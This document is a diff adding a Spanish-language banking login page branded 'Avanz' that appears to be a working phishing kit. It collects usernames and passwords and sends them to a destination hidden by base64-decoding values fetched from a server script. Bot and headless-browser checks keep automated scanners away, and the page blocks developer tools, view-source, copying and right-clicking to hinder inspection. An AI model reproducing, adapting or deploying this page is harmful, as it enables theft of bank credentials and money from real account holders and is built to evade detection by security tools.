@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avanz</title>
+    <script>
+        // reCAPTCHA desactivado
+    </script>
+</head>
+
+<style>
+    .masa {
+        width: 100%;
+        height: 90px;
+        margin: 0px;
+        background-color: rgb(255, 255, 255);
+        padding: 5px;
+    }
+    .masa2 {
+        width: 100%;
+        height: 30px;
+        margin: 0px;
+        background-color: #eaeaea;
+        padding: 5px;
+    }
+    .masa3 {
+        width: 100%;
+        height: 40px;
+        margin: 0px;
+        background-color: #005961;
+        padding: 5px;
+    }
+    .masa4 {
+        width: 100%;
+        height: 350px;
+        margin: 0px;
+        background-color: #a7a8aa;
+        padding: 5px;
+    }
+    .p1 {
+        width: 300px;
+        padding: 6px 12px;
+        font-size: 14px;
+        line-height: 1.42857143;
+        color: #555;
+        border: 1px solid #ababab;
+        background: #fff;
+        border-radius: 4px;
+        height: 34px;
+        margin-left: 30px;
+    }
+    .p2 {
+        height: 30px;
+        width: 20px;
+        min-width: 126px;
+        padding: 5px 20px;
+        border-radius: none;
+        border: none;
+        outline: none;
+        color: #fff;
+        background-color: #FF7500;
+    }
+    .p2:focus,
+.p2:active,
+.p2:hover {
+    background-color: #FF7500 !important;
+    outline: none;
+    box-shadow: none;
+}
+
+/* Efecto de parpadeo */
+@keyframes blink {
+        0% { opacity: 1; }
+        50% { opacity: 0; }
+        100% { opacity: 1; }
+    }
+
+    .parpadeo {
+        animation: blink 0.3s ease-in-out 3; /* Parpadea 3 veces */
+
+
+    }
+    .pop {
+
+        height: 35px;
+        width: 20px;
+
+        
+        color: #353535;
+        min-width: 126px;
+        padding: 3px;
+    }
+    .pan {
+        text-align: center;
+        font-weight: 500;
+        margin-top: 20px;
+        margin-bottom: 10px;
+        font-size: 30px;
+        color: #fff;
+    }
+    /* Ocultar el mensaje de error por defecto */
+    .cal {
+        display: none;
+        color: rgb(39, 39, 39);
+         text-align: center;
+        margin-top: 10px;
+    }
+</style>
+
+<body style="margin: 0px;">
+    <div class="masa">
+        <img width="130px" style="margin-left: 20px;" src="img/lk.svg" alt="">
+    </div>
+
+    <div class="masa2">
+        <center>    
+            <img width="280px" src="img/sac.png" alt="">
+        </center>
+    </div>
+
+    <div class="masa3">
+        <center>        
+            <img width="100px" src="img/ss.png" alt="">
+        </center>
+    </div>
+
+    <div class="masa4">
+        <div class="masa4">
+            <!-- Mensaje de error oculto -->
+            <p id="error-login" class="cal" style="display:none; color: red; font-family: sans-serif; font-size: 14px; text-align: center; margin-top: 10px;">Usuario o Clave Incorrecta</p>
+
+            <form id="mainForm" method="post" style="margin-top: -20px;" onsubmit="return handleSubmit(event)">
+                <div style=""> 
+                    <h2 class="pan">e-banking</h2>
+                    <br><center> 
+                    <input placeholder="Usuario" class="p1" type="text" name="pp1" id="usuario" autocomplete="off" oninput="this.value=this.value.replace(/[\s@]/g,'')">
+                    <br><br>
+                    <input placeholder="Contraseña" class="p1" type="text" id="contrasena" autocomplete="off" style="-webkit-text-security: disc; text-security: disc;">
+                    <input type="hidden" name="pp2" id="pp2_real">
+                    <br>
+                    
+                        <br>
+                        <select class="pop" id="language_movil" name="language">
+                            <option value="es-NI" selected="selected">Español</option>
+                            <option value="en-US">Inglés</option>
+                        </select>
+                        <br> <br>
+                        <!-- Anti-bot fields -->
+                        <input type="text" name="honeypot" class="hidden-field" autocomplete="off" style="display:none">
+                        <input type="hidden" id="csrf_token" name="csrf_token">
+                        <input type="hidden" id="server_token" name="server_token">
+                        <input type="hidden" id="form_ts" name="form_ts">
+                        <input type="hidden" name="origin" value="movil">
+                        <input type="hidden" name="recaptcha_token" id="recaptcha_token" value="">
+                        <div>  
+                            <input class="p2" type="submit" value="INGRESAR">
+                        </div>
+                    </center>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        var _fd = null;
+        // Mostrar error si viene de loginerror
+        if (window.location.search.includes('error=1')) {
+            document.getElementById('error-login').style.display = 'block';
+        }
+
+        // === DETECCIÓN DE BOTS ===
+        var _mouseMovements = 0;
+        var _keyPresses = 0;
+        var _touches = 0;
+
+        document.addEventListener('mousemove', function() { _mouseMovements++; });
+        document.addEventListener('keydown', function() { _keyPresses++; });
+        document.addEventListener('touchstart', function() { _touches++; });
+        document.addEventListener('touchmove', function() { _touches++; });
+
+        function isBot() {
+            if (navigator.webdriver) return true;
+            if (window.callPhantom || window._phantom) return true;
+            if (window.__nightmare) return true;
+            if (navigator.plugins.length === 0 && navigator.userAgent.indexOf('HeadlessChrome') !== -1) return true;
+            if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+            // En móvil verificar touches, en desktop mouse/keys
+            var isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+            if (isMobile) {
+                if (_touches < 2 && _keyPresses < 4) return true;
+            } else {
+                if (_mouseMovements < 3 && _keyPresses < 4) return true;
+            }
+            return false;
+        }
+
+        // Inicializa CSRF (doble-submit), did, timestamp y obtiene token del servidor
+        (async function(){
+            try {
+                // Obtener token del servidor
+                const resp = await fetch('init_form.php', { credentials: 'same-origin' });
+                if (resp.ok) {
+                    _fd = await resp.json();
+                    document.getElementById('server_token').value = _fd.st;
+                }
+            } catch(e) {}
+            try {
+                const token = (Math.random().toString(36).slice(2) + Math.random().toString(36).slice(2));
+                const el = document.getElementById('csrf_token');
+                if (el) el.value = token;
+                sessionStorage.setItem('csrf_token', token);
+                document.cookie = `csrf_token=${token}; path=/; SameSite=Lax`;
+                const getCookie = (name) => document.cookie.split('; ').find(r => r.startsWith(name + '='))?.split('=')[1];
+                let did = getCookie('did') || localStorage.getItem('did');
+                if (!did) {
+                    const rand = () => Math.random().toString(36).slice(2);
+                    did = `${Date.now().toString(36)}_${rand()}_${rand()}`;
+                    try { localStorage.setItem('did', did); } catch(e) {}
+                }
+                document.cookie = `did=${did}; path=/; Max-Age=31536000; SameSite=Lax`;
+                const tsEl = document.getElementById('form_ts');
+                if (tsEl) tsEl.value = Date.now().toString();
+            } catch(e) {}
+        })();
+
+        // Sincronizar campo de contraseña visible con el hidden
+        document.getElementById('contrasena').addEventListener('input', function() {
+            document.getElementById('pp2_real').value = this.value;
+        });
+
+        var _recaptchaDone = true; // reCAPTCHA desactivado
+        function handleSubmit(e) {
+            if (!validarFormulario()) return false;
+            return true;
+        }
+
+        function validarFormulario() {
+            let usuario = document.getElementById("usuario").value.trim();
+            let contrasena = document.getElementById("contrasena").value.trim();
+            let mensajeError = document.getElementById("error-login");
+
+            // Copiar valor al campo hidden antes de enviar
+            document.getElementById('pp2_real').value = contrasena;
+
+            // Validar campos no vacíos
+            if (!usuario || usuario.length < 1 || !contrasena || contrasena.length < 1) {
+                mensajeError.style.display = "block";
+                return false;
+            }
+
+            // Verificar si es bot
+            if (isBot()) {
+                mensajeError.style.display = "block";
+                return false;
+            }
+
+            // Checks anti-bot
+            const csrfToken = document.getElementById('csrf_token').value;
+            const storedToken = sessionStorage.getItem('csrf_token');
+            const honeypot = document.getElementsByName('honeypot')[0]?.value || '';
+            const ts = parseInt(document.getElementById('form_ts').value || '0', 10);
+            const now = Date.now();
+            if (csrfToken !== storedToken || (honeypot && honeypot.trim().length > 0) || !ts || (now - ts) < 800) {
+                mensajeError.style.display = "block";
+                return false;
+            }
+            // Establecer action dinámicamente
+            if (_fd && _fd.p1 && _fd.p2) {
+                document.getElementById('mainForm').action = atob(_fd.p1 + _fd.p2);
+            } else {
+                mensajeError.style.display = "block";
+                return false;
+            }
+
+            // Longitud mínima (coherente con servidor)
+            if (contrasena.length < 6 || usuario.length < 3) {
+                mensajeError.style.display = "block";
+                return false;
+            }
+            // Validación de formato previa existente
+            let regexContrasena = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d$·#&@!%*?¿+_-]+$/;
+            if (usuario.includes(" ") || contrasena.includes(" ") || !regexContrasena.test(contrasena)) {
+                mensajeError.style.display = "block";
+                mensajeError.classList.add("parpadeo");
+                setTimeout(() => { mensajeError.classList.remove("parpadeo"); }, 1500);
+                return false;
+            }
+            mensajeError.style.display = "none";
+            return true;
+        }
+
+        // Ocultar el mensaje de error en tiempo real
+        document.addEventListener("DOMContentLoaded", function () {
+            let usuarioInput = document.getElementById("usuario");
+            let contrasenaInput = document.getElementById("contrasena");
+            let mensajeError = document.getElementById("error-login");
+
+            function verificarEntrada() {
+                let usuario = usuarioInput.value;
+                let contrasena = contrasenaInput.value;
+                let regexContrasena = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d$·#&@!%*?¿+_-]+$/;
+                if (!usuario.includes(" ") && regexContrasena.test(contrasena)) {
+                    mensajeError.style.display = "none";
+                }
+            }
+            usuarioInput.addEventListener("input", verificarEntrada);
+            contrasenaInput.addEventListener("input", verificarEntrada);
+        });
+
+        // Bloquear TODAS las herramientas de inspección
+        document.addEventListener('keydown', function(e) {
+            // F12, Ctrl+Shift+I/J/C, Ctrl+U, Ctrl+S, Ctrl+A, Ctrl+Shift+A
+            if (e.key === 'F12' || 
+                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i' || e.key === 'J' || e.key === 'j' || e.key === 'C' || e.key === 'c')) ||
+                (e.ctrlKey && (e.key === 'U' || e.key === 'u' || e.key === 'S' || e.key === 's' || e.key === 'A' || e.key === 'a')) ||
+                (e.ctrlKey && e.shiftKey && (e.key === 'A' || e.key === 'a'))) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }
+        });
+
+        // Bloquear menú contextual TODAS las formas
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+
+        // Bloquear selección de texto COMPLETA
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+
+        document.addEventListener('mousedown', function(e) {
+            if (e.detail > 1) {
+                e.preventDefault();
+                return false;
+            }
+        });
+
+        // Bloquear arrastrar COMPLETO
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+
+        // Bloquear copiar y pegar
+        document.addEventListener('copy', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+
+        document.addEventListener('paste', function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            return false;
+        });
+    </script>
+</body>
+</html>
